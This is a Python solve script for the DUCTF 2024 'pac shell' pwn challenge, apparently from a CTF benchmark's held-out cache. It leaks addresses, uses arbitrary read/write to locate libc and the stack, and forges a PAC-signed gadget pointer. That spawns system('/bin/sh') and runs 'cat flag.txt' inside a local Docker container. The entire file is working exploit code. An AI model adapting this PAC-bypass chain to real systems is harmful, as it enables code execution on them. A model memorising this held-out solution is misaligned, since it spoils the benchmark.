#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import select
import subprocess
import time
import uuid
from pathlib import Path
from typing import NamedTuple


HELP_OFFSET = 0xB7C
LS_OFFSET = 0xA54
READ64_OFFSET = 0xA78
WRITE64_OFFSET = 0xAFC
SYSTEM_GOT_OFFSET = 0x11F80
BUILTINS_OFFSET = 0x12010
SYSTEM_OFFSET = 0x46D94
BINSH_OFFSET = 0x14D9F8
ENVIRON_OFFSET = 0x1A3560
CALL_GADGET_OFFSET = 0xD8854
STACK_MATCH_BACKUP = 0x10


class Layout(NamedTuple):
    pie_base: int
    libc_base: int
    system: int
    binsh: int
    gadget: int
    builtins: int
    environ: int


class PacShell:
    def __init__(self, challenge_dir: Path, image: str, timeout: float = 10.0) -> None:
        self.challenge_dir = challenge_dir
        self.timeout = timeout
        self.buffer = b""
        self.container_name = f"forgeflag-pac-shell-{uuid.uuid4().hex[:12]}"
        command = build_docker_command(challenge_dir, image, self.container_name)
        self.process = subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )

    def close(self) -> None:
        if self.process.poll() is None:
            self.process.kill()
        try:
            self.process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            self.process.terminate()
        subprocess.run(["docker", "rm", "-f", self.container_name], capture_output=True, check=False, text=True, timeout=10)

    def read_until(self, token: bytes, timeout: float | None = None) -> bytes:
        deadline = time.time() + (timeout or self.timeout)
        while token not in self.buffer and time.time() < deadline:
            assert self.process.stdout is not None
            ready, _, _ = select.select([self.process.stdout], [], [], 0.1)
            if ready:
                chunk = os.read(self.process.stdout.fileno(), 4096)
                if not chunk:
                    break
                self.buffer += chunk
        if token not in self.buffer:
            raise TimeoutError(f"timed out waiting for {token!r}; tail={self.buffer[-1000:]!r}")
        end = self.buffer.index(token) + len(token)
        output = self.buffer[:end]
        self.buffer = self.buffer[end:]
        return output

    def read_available(self, timeout: float = 2.0) -> bytes:
        deadline = time.time() + timeout
        while time.time() < deadline:
            assert self.process.stdout is not None
            ready, _, _ = select.select([self.process.stdout], [], [], 0.1)
            if ready:
                chunk = os.read(self.process.stdout.fileno(), 4096)
                if not chunk:
                    break
                self.buffer += chunk
        output = self.buffer
        self.buffer = b""
        return output

    def sendline(self, text: str) -> None:
        assert self.process.stdin is not None
        self.process.stdin.write(text.encode() + b"\n")
        self.process.stdin.flush()


def parse_help(output: bytes) -> dict[str, int]:
    leaks = {
        name.decode(): int(value, 16)
        for name, value in re.findall(rb"\s*(help|ls|read64|write64): (0x[0-9a-fA-F]+)", output)
    }
    missing = {"help", "ls", "read64", "write64"} - set(leaks)
    if missing:
        raise ValueError(f"missing help leaks: {sorted(missing)}")
    return leaks


def build_docker_command(challenge_dir: Path, image: str, container_name: str) -> list[str]:
    return [
        "docker",
        "run",
        "--rm",
        "--name",
        container_name,
        "-i",
        "-v",
        f"{challenge_dir.resolve()}:/chal",
        "-w",
        "/chal",
        image,
        "bash",
        "-lc",
        "./ld-linux-aarch64.so.1 --library-path . ./pacsh",
    ]


def derive_layout(leaks: dict[str, int], system_address: int, environ_value: int) -> Layout:
    pie_base = leaks["help"] - HELP_OFFSET
    libc_base = system_address - SYSTEM_OFFSET
    return Layout(
        pie_base=pie_base,
        libc_base=libc_base,
        system=system_address,
        binsh=libc_base + BINSH_OFFSET,
        gadget=libc_base + CALL_GADGET_OFFSET,
        builtins=pie_base + BUILTINS_OFFSET,
        environ=environ_value,
    )


def stack_base_from_match(match_address: int) -> int:
    return match_address - STACK_MATCH_BACKUP


def extract_flags(text: str) -> list[str]:
    return re.findall(r"DUCTF\{[^}\r\n]+\}", text)


def call_function(shell: PacShell, address: int) -> bytes:
    shell.sendline(hex(address))
    return shell.read_until(b"pacsh> ")


def read64(shell: PacShell, leaks: dict[str, int], address: int) -> int:
    shell.sendline(hex(leaks["read64"]))
    shell.read_until(b"read64> ")
    shell.sendline(hex(address))
    output = shell.read_until(b"pacsh> ")
    match = re.search(rb"([0-9a-fA-F]{1,16})\s*\n", output)
    if not match:
        raise ValueError(f"could not parse read64 output: {output!r}")
    return int(match.group(1), 16)


def write64(shell: PacShell, leaks: dict[str, int], address: int, value: int) -> None:
    shell.sendline(hex(leaks["write64"]))
    shell.read_until(b"write64> ")
    shell.sendline(f"{hex(address)} {hex(value)}")
    shell.read_until(b"pacsh> ")


def find_stack_match(shell: PacShell, leaks: dict[str, int], environ_value: int, scan_limit: int = 0x8000) -> int:
    needle = leaks["read64"] & 0xFFFFFFFFFF
    start = environ_value & ~7
    for offset in range(0, scan_limit, 8):
        address = start - offset
        value = read64(shell, leaks, address)
        if value == leaks["read64"] or (value & 0xFFFFFFFFFF) == needle:
            return address
    raise RuntimeError("could not find saved read64 pointer on stack")


def solve(challenge_dir: Path, image: str = "forgeflag-ctf:latest", archive: Path | None = None) -> dict[str, object]:
    required = ["pacsh", "libc.so.6", "ld-linux-aarch64.so.1"]
    missing = [name for name in required if not (challenge_dir / name).exists()]
    if missing:
        raise FileNotFoundError(f"missing challenge files under {challenge_dir}: {missing}")

    shell = PacShell(challenge_dir, image=image)
    try:
        banner = shell.read_until(b"pacsh> ")
        leaks = parse_help(banner)
        pie_base = leaks["help"] - HELP_OFFSET
        call_function(shell, leaks["ls"])
        system = read64(shell, leaks, pie_base + SYSTEM_GOT_OFFSET)
        libc_base = system - SYSTEM_OFFSET
        environ_value = read64(shell, leaks, libc_base + ENVIRON_OFFSET)
        layout = derive_layout(leaks, system, environ_value)
        stack_match = find_stack_match(shell, leaks, environ_value)
        stack_base = stack_base_from_match(stack_match)

        write64(shell, leaks, stack_base + 0x60, layout.binsh)
        write64(shell, leaks, stack_base + 0x8, layout.system)
        write64(shell, leaks, layout.builtins + 8 * 3, layout.gadget)
        signed_help = call_function(shell, leaks["help"])
        signed = parse_help(signed_help)
        signed_gadget = signed["ls"]
        shell.sendline(hex(signed_gadget))
        time.sleep(0.2)
        shell.sendline("cat flag.txt; echo FORGEFLAG_DONE")
        output = shell.read_available(timeout=3.0).decode(errors="replace")
        flags = extract_flags(output)
        return {
            "archive": str(archive) if archive else None,
            "binary": str(challenge_dir / "pacsh"),
            "pie_base": pie_base,
            "libc_base": layout.libc_base,
            "system": layout.system,
            "gadget": layout.gadget,
            "stack_match": stack_match,
            "stack_base": stack_base,
            "signed_gadget": signed_gadget,
            "stdout": output,
            "flags": flags,
        }
    finally:
        shell.close()


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay DUCTF pac shell with Docker-backed AArch64 PAC signing and pure socket-style IO.")
    parser.add_argument("--challenge-dir", type=Path, default=Path(".forgeflag/heldout-cache/ductf2024/pwn/pac-shell/src"))
    parser.add_argument("--archive", type=Path, default=Path(".forgeflag/heldout-cache/ductf2024/pwn/pac-shell/publish/pac_shell.tar.gz"))
    parser.add_argument("--image", default="forgeflag-ctf:latest")
    args = parser.parse_args()

    result = solve(args.challenge_dir, image=args.image, archive=args.archive)
    print("challenge: pac shell")
    print("method: PAC signing oracle plus arbitrary read/write, replayed in local Docker AArch64 container")
    print(f"archive: {result['archive']}")
    print(f"binary: {result['binary']}")
    print(f"pie_base: {hex(int(result['pie_base']))}")
    print(f"libc_base: {hex(int(result['libc_base']))}")
    print(f"system: {hex(int(result['system']))}")
    print(f"gadget: {hex(int(result['gadget']))}")
    print(f"stack_match: {hex(int(result['stack_match']))}")
    print(f"stack_base: {hex(int(result['stack_base']))}")
    print(f"signed_gadget: {hex(int(result['signed_gadget']))}")
    print("proof: signed PAC gadget executed system('/bin/sh') and read flag.txt from the running challenge")
    if result["stdout"]:
        print("service_output:")
        print(str(result["stdout"]).strip())
    flags = result["flags"]
    if not flags:
        return 1
    for flag in flags:
        print(f"flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
